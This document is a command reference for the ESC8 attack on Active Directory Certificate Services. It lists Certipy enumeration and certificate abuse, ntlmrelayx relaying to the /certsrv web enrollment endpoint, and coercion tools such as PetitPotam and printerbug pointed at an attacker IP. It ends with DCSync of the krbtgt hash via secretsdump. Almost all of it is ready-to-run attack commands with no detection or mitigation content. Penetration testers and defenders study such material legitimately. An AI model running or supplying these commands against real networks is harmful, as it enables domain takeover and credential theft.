# ESC8 Toolchain — Command Reference

## Certipy (enumeration + abuse)

| Command | Purpose | Example |
|---------|---------|---------|
| `certipy find` | Enumerate CAs/templates; flag vulnerabilities | `certipy find -u u@corp.local -p pw -dc-ip 10.0.0.10 -vulnerable -enabled -stdout` |
| `certipy auth` | PKINIT with a .pfx -> TGT + NT hash | `certipy auth -pfx dc01.pfx -dc-ip 10.0.0.10` |
| `certipy req` | Request a certificate from a template | `certipy req -u u@corp.local -ca CORP-CA -template DomainController` |

Useful `find` flags: `-vulnerable`, `-enabled`, `-stdout`, `-json`, `-dc-ip`, `-ns`.

## Impacket ntlmrelayx (relay engine)

| Flag | Purpose |
|------|---------|
| `-t <url>` | Target to relay to (e.g. `http://ca/certsrv/certfnsh.asp`) |
| `-tf <file>` | File of multiple relay targets |
| `--adcs` | Enable AD CS relay attack (request certificate) |
| `--template <name>` | Certificate template (`DomainController`, `Machine`, `User`) |
| `-smb2support` | Accept SMB2 connections from coerced auth |
| `-socks` | Hold relayed sessions in a SOCKS proxy |
| `-i` | Drop to an interactive SMB/LDAP shell |
| `--no-http-server` / `--no-smb-server` | Disable specific relay servers |

```bash
impacket-ntlmrelayx -t http://ca01.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

## Coercion Tools

| Tool | Protocol | Example |
|------|----------|---------|
| PetitPotam | MS-EFSRPC | `python3 PetitPotam.py -u u -p pw -d corp.local <attacker_ip> <dc_ip>` |
| Coercer | Multi-protocol | `coercer coerce -u u -p pw -d corp.local -l <attacker_ip> -t <dc_ip>` |
| printerbug.py | MS-RPRN | `python3 printerbug.py corp.local/u:pw@<dc_ip> <attacker_ip>` |
| dementor.py | MS-RPRN | `python3 dementor.py <attacker_ip> <dc_ip> -u u -p pw -d corp.local` |

## Post-Exploitation

| Command | Purpose | Example |
|---------|---------|---------|
| `impacket-secretsdump` | DCSync with TGT/hash | `KRB5CCNAME=dc01.ccache impacket-secretsdump -k -no-pass corp.local/'DC01$'@dc01 -just-dc-user krbtgt` |
| `impacket-getTGT` | Request TGT from hash | `impacket-getTGT corp.local/'DC01$' -hashes :<NTHASH>` |

## Web Enrollment Endpoints (relay targets)

| Endpoint | Notes |
|----------|-------|
| `/certsrv/certfnsh.asp` | Certificate submission page (primary ESC8 target) |
| `/certsrv/` | Web Enrollment root |
| `/ADPolicyProvider_CEP_Kerberos/service.svc` | CES/CEP (ESC11-related) |

## External References

- Impacket: https://github.com/fortra/impacket
- Certipy wiki: https://github.com/ly4k/Certipy/wiki
- HackingArticles ESC8: https://www.hackingarticles.in/adcs-esc8-ntlm-relay-to-ad-cs-http-endpoints/
